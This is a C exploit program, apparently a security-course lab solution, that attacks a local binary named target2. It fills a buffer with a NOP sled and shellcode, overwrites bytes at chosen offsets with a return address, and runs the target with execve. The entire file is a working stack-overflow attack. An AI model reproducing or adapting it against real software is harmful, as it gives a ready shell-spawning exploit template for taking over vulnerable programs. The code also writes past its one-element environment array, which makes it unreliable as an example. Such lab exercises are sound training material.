#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char * env[1];
	int BUFSIZE = 284;
	char attackBuffer[BUFSIZE];
	int shellcode_length = 45;
	int i;
	for (i = 0; i < BUFSIZE; i++){
		attackBuffer[i] = 0x90;	
	}
	for (i = 0; i < 45; i ++){
		attackBuffer[100 + i] = shellcode[i];
	}
	*(int *) & attackBuffer[268] = 283;
	//*(char *) & attackBuffer[268] = 0x1b;
	//*(char *) & attackBuffer[269] = 0x1;
	//*(int *) & attackBuffer[264] = 264;
	*(char *) & attackBuffer[264] = 0xb;
	*(char *) & attackBuffer[265] = 0x1;
	*(int *) & attackBuffer[200] = 0x3050fd40;



	for (i = 0; i < BUFSIZE;){
		printf("%x\n", *(unsigned long *) &attackBuffer[i]);
		i = i + 4;
	}


	args[0] = TARGET;
	args[1] = attackBuffer;
	args[2] = NULL;
	
	env[0] = &attackBuffer[270];
	env[1] = &attackBuffer[192];



	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
